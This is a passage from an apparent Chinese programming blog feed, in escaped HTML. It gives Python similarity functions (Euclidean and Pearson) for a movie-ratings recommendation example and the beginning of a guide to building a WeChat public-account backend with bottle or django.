    &lt;span class="s1"&gt;&amp;#39;Mick LaSalle&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Lady in the Water&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mf"&gt;3.0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Snakes on a Plane&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mf"&gt;4.0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; 
     &lt;span class="s1"&gt;&amp;#39;Just My Luck&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mf"&gt;2.0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Superman Returns&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mf"&gt;3.0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;The Night Listener&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mf"&gt;3.0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
     &lt;span class="s1"&gt;&amp;#39;You, Me and Dupree&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mf"&gt;2.0&lt;/span&gt;&lt;span class="p"&gt;},&lt;/span&gt; 
    &lt;span class="s1"&gt;&amp;#39;Jack Matthews&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Lady in the Water&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mf"&gt;3.0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Snakes on a Plane&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mf"&gt;4.0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
     &lt;span class="s1"&gt;&amp;#39;The Night Listener&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mf"&gt;3.0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Superman Returns&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mf"&gt;5.0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;You, Me and Dupree&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mf"&gt;3.5&lt;/span&gt;&lt;span class="p"&gt;},&lt;/span&gt;
    &lt;span class="s1"&gt;&amp;#39;Toby&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Snakes on a Plane&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mf"&gt;4.5&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;You, Me and Dupree&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mf"&gt;1.0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Superman Returns&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mf"&gt;4.0&lt;/span&gt;&lt;span class="p"&gt;}}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;这些数据是python的字典格式,你如果熟悉js,会发现它几乎就是json格式.&lt;br /&gt;
大多网站api接口返回的格式都是json，这样你就知道用python处理这些数据是多么容易.  &lt;/p&gt;
&lt;p&gt;现在我想挖掘一下这些数据，看看哪两个人的品味比较接近。&lt;br /&gt;
摆在我面前的问题是如何度量两个人的品味相似程度呢.毕竟口味这东西不是空间距离可以度量。&lt;br /&gt;
&lt;code&gt;距离&lt;/code&gt;真是个很好的隐喻。两个品味不同的人就像来自两个星球&lt;br /&gt;
如果我们能找到一个数值来度量两个人品味的距离，那么这个问题就变成了数值计算问题！！&lt;br /&gt;
还真有这样的东西，我们可以用&lt;code&gt;欧吉里德距离&lt;/code&gt;和&lt;code&gt;皮尔逊相关度&lt;/code&gt;来度量两者相似度.&lt;br /&gt;
这里有一个很有趣的概念，叫偏好空间。我们使用以上数据作图：&lt;br /&gt;
&lt;img alt="偏好空间" src="content/img/suanfa-1.jpeg" /&gt;
两个人在偏好空间中距离越近，表示品味越近.如果有多项评分，那么这张图就对应多维。依然适用&lt;/p&gt;
&lt;p&gt;我们直接给出计算相似度的欧吉里德方法吧：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;    &lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;math&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;sqrt&lt;/span&gt;

    &lt;span class="c1"&gt;# Returns a distance-based similarity score for person1 and person2&lt;/span&gt;
    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;sim_distance&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;prefs&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;person1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;person2&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
      &lt;span class="c1"&gt;# Get the list of shared_items&lt;/span&gt;
      &lt;span class="n"&gt;si&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;{}&lt;/span&gt;
      &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;item&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;prefs&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;person1&lt;/span&gt;&lt;span class="p"&gt;]:&lt;/span&gt; 
        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;item&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;prefs&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;person2&lt;/span&gt;&lt;span class="p"&gt;]:&lt;/span&gt; &lt;span class="n"&gt;si&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;item&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;

      &lt;span class="c1"&gt;# if they have no ratings in common, return 0&lt;/span&gt;
      &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;si&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;

      &lt;span class="c1"&gt;# Add up the squares of all the differences&lt;/span&gt;
      &lt;span class="n"&gt;sum_of_squares&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nb"&gt;sum&lt;/span&gt;&lt;span class="p"&gt;([&lt;/span&gt;&lt;span class="nb"&gt;pow&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;prefs&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;person1&lt;/span&gt;&lt;span class="p"&gt;][&lt;/span&gt;&lt;span class="n"&gt;item&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;prefs&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;person2&lt;/span&gt;&lt;span class="p"&gt;][&lt;/span&gt;&lt;span class="n"&gt;item&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; 
                          &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;item&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;prefs&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;person1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;item&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;prefs&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;person2&lt;/span&gt;&lt;span class="p"&gt;]])&lt;/span&gt;

      &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;sum_of_squares&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;这里的核心公式，就是数学中简单的两点间距离计算公式,代码只是对此的一个实现，理解时建议在旁边写个数学距离计算公式，那样比代码更能清晰表达算法的本质。&lt;/p&gt;
&lt;p&gt;顺便把皮尔逊计算方法也写上，稍后解释：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;    &lt;span class="c1"&gt;# Returns the Pearson correlation coefficient for p1 and p2&lt;/span&gt;
    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;sim_pearson&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;prefs&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;p1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;p2&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
      &lt;span class="c1"&gt;# Get the list of mutually rated items&lt;/span&gt;
      &lt;span class="n"&gt;si&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;{}&lt;/span&gt;
      &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;item&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;prefs&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;p1&lt;/span&gt;&lt;span class="p"&gt;]:&lt;/span&gt; 
        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;item&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;prefs&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;p2&lt;/span&gt;&lt;span class="p"&gt;]:&lt;/span&gt; &lt;span class="n"&gt;si&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;item&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;

      &lt;span class="c1"&gt;# if they are no ratings in common, return 0&lt;/span&gt;
      &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;si&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;

      &lt;span class="c1"&gt;# Sum calculations&lt;/span&gt;
      &lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;si&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

      &lt;span class="c1"&gt;# Sums of all the preferences&lt;/span&gt;
      &lt;span class="n"&gt;sum1&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nb"&gt;sum&lt;/span&gt;&lt;span class="p"&gt;([&lt;/span&gt;&lt;span class="n"&gt;prefs&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;p1&lt;/span&gt;&lt;span class="p"&gt;][&lt;/span&gt;&lt;span class="n"&gt;it&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;it&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;si&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;
      &lt;span class="n"&gt;sum2&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nb"&gt;sum&lt;/span&gt;&lt;span class="p"&gt;([&lt;/span&gt;&lt;span class="n"&gt;prefs&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;p2&lt;/span&gt;&lt;span class="p"&gt;][&lt;/span&gt;&lt;span class="n"&gt;it&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;it&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;si&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;

      &lt;span class="c1"&gt;# Sums of the squares&lt;/span&gt;
      &lt;span class="n"&gt;sum1Sq&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nb"&gt;sum&lt;/span&gt;&lt;span class="p"&gt;([&lt;/span&gt;&lt;span class="nb"&gt;pow&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;prefs&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;p1&lt;/span&gt;&lt;span class="p"&gt;][&lt;/span&gt;&lt;span class="n"&gt;it&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;it&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;si&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;
      &lt;span class="n"&gt;sum2Sq&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nb"&gt;sum&lt;/span&gt;&lt;span class="p"&gt;([&lt;/span&gt;&lt;span class="nb"&gt;pow&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;prefs&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;p2&lt;/span&gt;&lt;span class="p"&gt;][&lt;/span&gt;&lt;span class="n"&gt;it&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;it&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;si&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;   

      &lt;span class="c1"&gt;# Sum of the products&lt;/span&gt;
      &lt;span class="n"&gt;pSum&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nb"&gt;sum&lt;/span&gt;&lt;span class="p"&gt;([&lt;/span&gt;&lt;span class="n"&gt;prefs&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;p1&lt;/span&gt;&lt;span class="p"&gt;][&lt;/span&gt;&lt;span class="n"&gt;it&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;prefs&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;p2&lt;/span&gt;&lt;span class="p"&gt;][&lt;/span&gt;&lt;span class="n"&gt;it&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;it&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;si&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;

      &lt;span class="c1"&gt;# Calculate r (Pearson score)&lt;/span&gt;
      &lt;span class="n"&gt;num&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;pSum&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sum1&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;sum2&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
      &lt;span class="n"&gt;den&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;sqrt&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="n"&gt;sum1Sq&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="nb"&gt;pow&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sum1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sum2Sq&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="nb"&gt;pow&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sum2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
      &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;den&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;

      &lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;num&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;den&lt;/span&gt;

      &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;r&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;waiting&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Tue, 07 Jan 2014 00:00:00 +0000</pubDate><guid>tag:,2014-01-07:learning python 2.html</guid><category>python</category></item><item><title>微信小结</title><link>/weixin-learning.html</link><description>&lt;p&gt;上个月搭了一个微信公众平台，后台用的是&lt;code&gt;python&lt;/code&gt;（之前用&lt;code&gt;bootle&lt;/code&gt;,现在改用&lt;code&gt;django&lt;/code&gt;），当然用什么语言是无关紧要的。&lt;/p&gt;
&lt;p&gt;近期服务器环境从&lt;code&gt;bae&lt;/code&gt;迁回本地环境（学校给了个服务器），bae上调试不方便，而且稳定性没有保障，变动频繁。当然国内的开放平台基本这样，bae相对算是不错的，似乎由于开源潮流势不可挡的缘故，各家公司不情愿地做个开放平台，深怕被对手甩下，至少在舆论上不落后，又不理解开放的意义，只能做得很蹩脚。当然如果练手的话，bae还是挺不错的。    &lt;/p&gt;
&lt;p&gt;之所以换用django，主要是为了后期的功能加强考虑，之后涉及到session，数据库之类的问题的话，用django熟悉些，扩展起来可能会容易些。&lt;/p&gt;
&lt;p&gt;如果在&lt;code&gt;bae/sae&lt;/code&gt;之类的云环境下部署的话，推荐使用bootle，django配置起来麻烦些。bootle很小巧便捷，仅是一个文件而已，不会出现依赖问题，极其适合练手。&lt;a href="http://article.yeeyan.org/view/35282/123019"&gt;bootle入门&lt;/a&gt;。bae上需要注意一下第三库的配置，就是说你在这里不能使用pip，得自行打包依赖的库，一并上传，之后添加到系统路径里就行。如果在bae下具体可参考&lt;a href="http://git.oschina.net/397667796/bae_django/tree/master/1"&gt;here&lt;/a&gt; 。模仿这个项目布局就行，deps里放置第三方库。 在index.py里加上&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;deps_path = os.path.join(os.path.split(os.path.realpath(__file__))[0],&amp;#39;deps&amp;#39;)
if deps_path not in sys.path:
        sys.path.insert(0, deps_path)
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;实际上写一个微信公众平台要比开发一个网站简单得多。不需要前台，不需要美工，后台的逻辑也极其简单。&lt;/p&gt;
&lt;h3&gt;关于微信&lt;/h3&gt;
&lt;p&gt;waiting...&lt;br /&gt;
重要的部分其实和使用什么语言写后台无关，重在熟悉微信的&lt;code&gt;api&lt;/code&gt;，数据格式之类&lt;/p&gt;
&lt;h3&gt;基本思路&lt;/h3&gt;
&lt;p&gt;先说说基本的思路。理解了之后，至于用什么语言作后台来实现，都是细节问题。之后我会演示使用bootle和django来实现（初学者推荐使用bootle。）&lt;/p&gt;
&lt;p&gt;你需要有以下以下东西：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;一个公网ip&lt;/li&gt;
&lt;li&gt;服务器使用80端口&lt;/li&gt;
&lt;li&gt;分配一个url给微信使用&lt;/li&gt;
&lt;li&gt;申请公众帐号，为了获得token（之后会用到）&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;that's all &lt;/p&gt;
&lt;p&gt;那么我们来看看，从用户发送消息，到收到公众帐号的回应，期间发生了什么。&lt;/p&gt;
&lt;p&gt;&lt;img alt="图片" src="img/weixin.jpeg" /&gt;&lt;/p&gt;
&lt;p&gt;可以看出，微信扮演中介的角色。&lt;/p&gt;
&lt;p&gt;waiting...&lt;/p&gt;
&lt;h3&gt;与微信通信&lt;/h3&gt;
&lt;p&gt;首先登录你的公众账户，绑定url&lt;/p&gt;
&lt;p&gt;如上图所示，我们站在服务器的角度，我们需处理接收微信发送过来的请求，请求分两种，一种是get，一种是post。我么大多时间在处理post过来的数据。这里需要学习的东西主要是数据的格式，参考微信的开发者文档。&lt;/p&gt;
&lt;p&gt;在服务器与微信公众帐号建立关联的时候，微信会验证服务器是否合格。技术上的细节是微信会get请求绑定的url，我们需要按要求返回数据，这样就能通过微信的认证。直接上代码：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;bootle&lt;/code&gt;里这样写：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;    &lt;span class="c1"&gt;#-*- coding:utf-8 -*-&lt;/span&gt;
    &lt;span class="c1"&gt;#! /usr/bin/env python&lt;/span&gt;
    &lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;bottle&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;
    &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;hashlib&lt;/span&gt;

    &lt;span class="nd"&gt;@get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;checkSignature&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
            &lt;span class="n"&gt;token&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;your token&amp;quot;&lt;/span&gt;  &lt;span class="c1"&gt;#登录你的微信公众平台，里面可以查到  &lt;/span&gt;
            &lt;span class="n"&gt;signature&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;GET&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;signature&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="bp"&gt;None&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
            &lt;span class="n"&gt;timestamp&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;GET&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;timestamp&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="bp"&gt;None&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
            &lt;span class="n"&gt;nonce&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;GET&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;nonce&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="bp"&gt;None&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
            &lt;span class="n"&gt;echostr&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;GET&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;echostr&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="bp"&gt;None&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
            &lt;span class="n"&gt;tmpList&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;token&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;timestamp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;nonce&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
            &lt;span class="n"&gt;tmpList&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sort&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
            &lt;span class="n"&gt;tmpstr&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="si"&gt;%s%s%s&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="nb"&gt;tuple&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;tmpList&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
